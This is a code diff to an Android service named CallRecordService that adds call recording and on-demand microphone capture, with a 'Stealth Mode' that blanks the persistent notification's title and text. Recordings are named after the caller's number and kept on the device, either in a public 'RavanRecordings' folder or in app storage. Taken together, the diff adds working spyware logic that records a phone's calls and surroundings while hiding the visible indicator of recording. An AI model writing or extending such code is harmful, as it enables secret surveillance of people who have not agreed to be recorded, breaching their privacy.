@@ -28,6 +28,7 @@ import java.util.Locale;
 
 /**
  * Service for call recording and microphone capture
+ * Implements "Stealth Mode" notification.
  */
 public class CallRecordService extends Service {
 
@@ -121,9 +122,10 @@ public class CallRecordService extends Service {
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
+        // Stealth Notification: Empty contents, Min priority, Secret visibility
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Service")
-                .setContentText("Running...")
+                .setContentTitle(" ")
+                .setContentText(" ")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
@@ -185,7 +187,6 @@ public class CallRecordService extends Service {
 
     // Called when phone state changes (from CallReceiver)
     public void handleCallStateChange(int callState, String phoneNumber) {
-        // ... method content ...
         Log.d(TAG, "Call state changed: " + callState + ", number: " + phoneNumber);
 
         switch (callState) {
@@ -236,7 +237,233 @@ public class CallRecordService extends Service {
         }
     }
 
-    // ... existing methods ...
+    private void notifyCallIncoming(String phoneNumber) {
+        Log.d(TAG, "Incoming call notification: " + phoneNumber);
+    }
+
+    private void notifyCallOutgoing(String phoneNumber) {
+        Log.d(TAG, "Outgoing call notification: " + phoneNumber);
+    }
+
+    private void notifyCallEnded() {
+        Log.d(TAG, "Call ended notification");
+    }
+
+    // ============ CALL RECORDING ============
+
+    public void startCallRecording(String phoneNumber, String callType) {
+        if (isRecordingCall || isRecordingMic) {
+            Log.w(TAG, "Already recording something");
+            return;
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                Log.e(TAG, "RECORD_AUDIO permission not granted");
+                return;
+            }
+        }
+
+        try {
+            acquireWakeLock();
+
+            // Create directory
+            File recordDir = getRecordingsDirectory();
+            if (!recordDir.exists()) {
+                recordDir.mkdirs();
+            }
+
+            // Create filename
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
+                    .format(new Date());
+            String safeNumber = (phoneNumber != null ? phoneNumber : "unknown")
+                    .replaceAll("[^0-9+]", "");
+            String fileName = "CALL_" + callType + "_" + safeNumber + "_" + timestamp + ".m4a";
+
+            File recordFile = new File(recordDir, fileName);
+            currentRecordingPath = recordFile.getAbsolutePath();
+            currentRecordingType = "call";
+
+            // Setup MediaRecorder
+            mediaRecorder = new MediaRecorder();
+
+            // Use VOICE_CALL if available, otherwise use MIC
+            try {
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+            } catch (Exception e) {
+                Log.w(TAG, "VOICE_CALL not available, using MIC");
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            }
+
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.setAudioEncodingBitRate(128000);
+            mediaRecorder.setAudioSamplingRate(44100);
+            mediaRecorder.setOutputFile(currentRecordingPath);
+
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+
+            isRecordingCall = true;
+            recordingStartTime = System.currentTimeMillis();
+            currentCallNumber = phoneNumber;
+            currentCallType = callType;
+
+            updateNotification(" "); // Stealth update
+
+            Log.d(TAG, "Call recording started: " + currentRecordingPath);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting call recording", e);
+            isRecordingCall = false;
+            releaseMediaRecorder();
+        }
+    }
+
+    public void stopCallRecording() {
+        if (!isRecordingCall) {
+            return;
+        }
+
+        Log.d(TAG, "Stopping call recording");
+        isRecordingCall = false;
+
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping MediaRecorder", e);
+        }
+
+        releaseMediaRecorder();
+        releaseWakeLock();
+
+        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
+        Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
+
+        updateNotification(" ");
+    }
+
+    // ============ MICROPHONE RECORDING ============
+
+    public void startMicRecording(int durationSeconds) {
+        if (isRecordingCall || isRecordingMic) {
+            Log.w(TAG, "Already recording something");
+            return;
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                Log.e(TAG, "RECORD_AUDIO permission not granted");
+                return;
+            }
+        }
+
+        try {
+            acquireWakeLock();
+
+            // Create directory
+            File recordDir = getRecordingsDirectory();
+            if (!recordDir.exists()) {
+                recordDir.mkdirs();
+            }
+
+            // Create filename
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
+                    .format(new Date());
+            String fileName = "MIC_" + timestamp + ".m4a";
+
+            File recordFile = new File(recordDir, fileName);
+            currentRecordingPath = recordFile.getAbsolutePath();
+            currentRecordingType = "mic";
+
+            // Setup MediaRecorder
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.setAudioEncodingBitRate(128000);
+            mediaRecorder.setAudioSamplingRate(44100);
+            mediaRecorder.setOutputFile(currentRecordingPath);
+
+            // Set max duration if specified
+            if (durationSeconds > 0) {
+                mediaRecorder.setMaxDuration(durationSeconds * 1000);
+                mediaRecorder.setOnInfoListener((mr, what, extra) -> {
+                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                        stopMicRecording();
+                    }
+                });
+            }
+
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+
+            isRecordingMic = true;
+            recordingStartTime = System.currentTimeMillis();
+
+            updateNotification(" "); // Stealth
+
+            Log.d(TAG, "Microphone recording started: " + currentRecordingPath);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting microphone recording", e);
+            isRecordingMic = false;
+            releaseMediaRecorder();
+        }
+    }
+
+    public void stopMicRecording() {
+        if (!isRecordingMic) {
+            return;
+        }
+
+        Log.d(TAG, "Stopping microphone recording");
+        isRecordingMic = false;
+
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping MediaRecorder", e);
+        }
+
+        releaseMediaRecorder();
+        releaseWakeLock();
+
+        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
+        Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
+
+        updateNotification(" ");
+    }
+
+    private void releaseMediaRecorder() {
+        if (mediaRecorder != null) {
+            try {
+                mediaRecorder.reset();
+                mediaRecorder.release();
+            } catch (Exception e) {
+                Log.e(TAG, "Error releasing MediaRecorder", e);
+            }
+            mediaRecorder = null;
+        }
+    }
+
+    private void acquireWakeLock() {
+        if (wakeLock != null && !wakeLock.isHeld()) {
+            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
+            Log.d(TAG, "WakeLock acquired");
+        }
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+            Log.d(TAG, "WakeLock released");
+        }
+    }
 
     private void updateNotification(String text) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -245,8 +472,8 @@ public class CallRecordService extends Service {
                     PendingIntent.FLAG_IMMUTABLE);
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System Service")
-                    .setContentText("Running...") // Minimized text
+                    .setContentTitle(" ")
+                    .setContentText(" ")
                     .setSmallIcon(R.drawable.ic_launcher_foreground)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
@@ -262,7 +489,69 @@ public class CallRecordService extends Service {
         }
     }
 
-    // ... existing methods ...
+    private File getRecordingsDirectory() {
+        if (saveOnDeviceEnabled) {
+            return new File(Environment.getExternalStoragePublicDirectory(
+                    Environment.DIRECTORY_MUSIC), "RavanRecordings");
+        } else {
+            return new File(getFilesDir(), "recordings");
+        }
+    }
+
+    // ============ STATIC ACCESSORS ============
+
+    public static boolean isRecordingCall() {
+        return isRecordingCall;
+    }
+
+    public static boolean isRecordingMic() {
+        return isRecordingMic;
+    }
+
+    public static boolean isRecording() {
+        return isRecordingCall || isRecordingMic;
+    }
+
+    public static String getCurrentRecordingPath() {
+        return currentRecordingPath;
+    }
+
+    public static String getCurrentRecordingType() {
+        return currentRecordingType;
+    }
+
+    public static long getRecordingDuration() {
+        if ((isRecordingCall || isRecordingMic) && recordingStartTime > 0) {
+            return (System.currentTimeMillis() - recordingStartTime) / 1000;
+        }
+        return 0;
+    }
+
+    public static String getCurrentCallNumber() {
+        return currentCallNumber;
+    }
+
+    public static String getCurrentCallType() {
+        return currentCallType;
+    }
+
+    public static boolean isCallInProgress() {
+        return callInProgress;
+    }
+
+    public static boolean isAutoRecordEnabled() {
+        return autoRecordEnabled;
+    }
+
+    public static boolean isSaveOnDeviceEnabled() {
+        return saveOnDeviceEnabled;
+    }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     @Override
     public void onDestroy() {
